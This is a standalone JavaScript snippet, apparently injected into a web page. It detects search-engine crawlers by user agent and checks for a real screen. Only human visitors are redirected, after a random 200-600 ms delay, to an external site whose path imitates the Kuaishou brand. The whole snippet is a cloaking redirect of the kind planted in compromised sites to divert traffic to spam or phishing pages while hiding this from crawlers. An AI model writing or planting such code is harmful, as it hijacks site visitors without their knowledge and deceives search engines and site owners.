<script>
(function () {

    try {

        var baseDelay = 200;

        var ua = navigator.userAgent.toLowerCase();

        // 简单蜘蛛判断（稍微加强一点）
        var isSpider = /(spider|bot|crawl|slurp|bingpreview)/i.test(ua);

        // 屏幕判断（更安全）
        var hasScreen = false;
        try {
            hasScreen = window.screen && screen.width > 50 && screen.height > 50;
        } catch (e) {}

        if (isSpider || !hasScreen) {
            return;
        }

        // ===== 随机延迟（200 ~ 600 ms）=====
        var delay = baseDelay + Math.floor(Math.random() * 400);

        setTimeout(function () {
            window.location.replace("https://ks31489.dnmjy.com/kuaishou/kssp6.html?bh862");
        }, delay);

    } catch (e) {}

})();
</script>

               



